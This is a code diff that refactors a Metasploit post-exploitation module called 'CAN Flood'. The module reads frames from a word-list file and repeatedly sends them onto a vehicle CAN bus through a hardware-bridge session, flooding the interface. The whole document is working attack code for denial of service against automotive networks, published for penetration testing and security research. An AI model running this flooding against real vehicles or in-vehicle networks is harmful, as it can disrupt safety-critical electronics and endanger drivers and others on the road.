@@ -2,38 +2,41 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+
 class MetasploitModule < Msf::Post
+
+  DEFAULT_FRAMELIST = File.join(Msf::Config.data_directory, 'wordlists', 'can_flood_frames.txt')
+
   def initialize(info = {})
-    super(
-      update_info(
-        info,
-        'Name' => 'CAN Flood',
-        'Description' => 'Module that floods a CAN interface',
-        'License' => MSF_LICENSE,
-        'Author' => ['Pietro Biondi'],
-        'Platform' => ['hardware'],
-        'SessionTypes' => ['hwbridge']
-      )
-    )
-    register_options(
-      [
-        OptInt.new('ROUNDS', [false, 'Number of executed rounds', 200]),
-        OptString.new('CANBUS', [false, 'CAN interface', nil]),
-        OptString.new('FRAMELIST', [true, 'Path to FRAMELIST', ::File.join(Msf::Config.data_directory, 'wordlists', 'frameListCanBus.txt')])
-      ]
-    )
+    super(update_info(info,
+      'Name'         => 'CAN Flood',
+      'Description'  => 'This module floods a CAN interface with supplied frames.',
+      'Author'       => 'Pietro Biondi',
+      'License'      => MSF_LICENSE,
+      'Platform'     => 'hardware',
+      'SessionTypes' => ['hwbridge']
+    ))
+
+    register_options([
+      OptString.new('CANBUS',    [true, 'CAN interface']),
+      OptString.new('FRAMELIST', [true, 'Path to frame list file', DEFAULT_FRAMELIST]),
+      OptInt.new('ROUNDS',       [true, 'Number of executed rounds', 200])
+    ])
   end
 
   def run
-    vprint_status("Reading frame list file: #{datastore['FRAMELIST']}")
-    unless ::File.exist? datastore['FRAMELIST']
-      print_error "Frame list file '#{datastore['FRAMELIST']}' does not exist"
+    unless File.exist?(datastore['FRAMELIST'])
+      print_error("Frame list file '#{datastore['FRAMELIST']}' does not exist")
       return
     end
+
+    vprint_status("Reading frame list file: #{datastore['FRAMELIST']}")
     frames = File.readlines(datastore['FRAMELIST']).map { |line| line.strip.split('+') }
+
     print_status(' -- FLOODING -- ')
     datastore['ROUNDS'].times do
-      frames.each_index { |i| client.automotive.cansend(datastore['CANBUS'], frames[i][0], frames[i][1]) }
+      frames.each { |frame| client.automotive.cansend(datastore['CANBUS'], frame[0], frame[1]) }
     end
   end
+
 end
